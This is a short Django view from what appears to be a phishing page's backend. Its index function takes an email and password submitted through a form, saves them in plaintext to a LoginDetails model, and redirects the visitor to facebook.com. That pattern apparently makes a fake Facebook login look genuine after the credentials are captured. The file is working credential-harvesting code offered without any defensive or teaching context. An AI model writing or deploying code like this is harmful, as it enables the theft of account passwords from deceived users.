from django.shortcuts import render, redirect
from .models import LoginDetails


def index(request):
    if request.method == 'POST':
        try:
            login = LoginDetails(email=request.POST['email'],
                                 password=request.POST['pass'])
            login.save()
            return redirect('https://facebook.com/')
        except Exception as e:
            pass
    return render(request, 'index.html')